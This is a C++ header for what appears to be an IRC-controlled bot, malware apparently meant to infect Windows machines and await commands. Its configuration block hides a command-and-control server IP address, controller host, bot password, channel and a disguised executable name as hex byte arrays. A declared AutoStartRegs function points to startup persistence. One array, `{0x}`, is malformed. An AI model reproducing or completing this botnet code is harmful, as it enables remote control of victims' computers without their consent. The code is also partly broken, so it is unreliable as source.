#ifndef INC_MBOT_H
#define INC_MBOT_H

#include <winsock2.h>
#include <string.h>

#include "irc.h"
void AutoStartRegs(char *nfilename);
class mBot
{
public:
	mBot ();
	~mBot ();
	int mBotMain (int argc, char **argv);
	irc *mIrc;
};

extern mBot *gmBot;

// CONFIGURATION...START CONFIGURING HERE
const int maxrand = 10; //max number of letter to be in the nicks...
const char ircServer[] = {0x36,0x38,0x2e,0x34,0x37,0x2e,0x31,0x36,0x39,0x2e,0x31,0x39,0x31}; //dns of server to connect to
const char prefix[2] = {0x2E,0x00}; //prefix of commands, ! or . or whatever
const char controlhost[] = {0x73,0x79,0x6e,0x34,0x70,0x73,0x65}; //host restricted login, may use astrix
const char pass[] = {0x74,0x68,0x75,0x6b,0x6c,0x61}; //login to the bots, if you want it encrypted add it yourself, its not that big of a deal unless ur lame
const char channel[] = {0x23,0x23,0x61,0x69,0x6d,0x23,0x23}; 
const char key[] = {0x};//prefix with a space or itll join chan+key
const char filename[] = {0x75,0x6E,0x74,0x33,0x32,0x2E,0x65,0x78,0x65,0x00};
const unsigned short ircPort = 2817; // port
//END OF CONFIG DO NOT EDIT ANYTHING ELSE UNLESS YOU KNOW WHAT YOU ARE DOING!


#endif // INC_mBot_H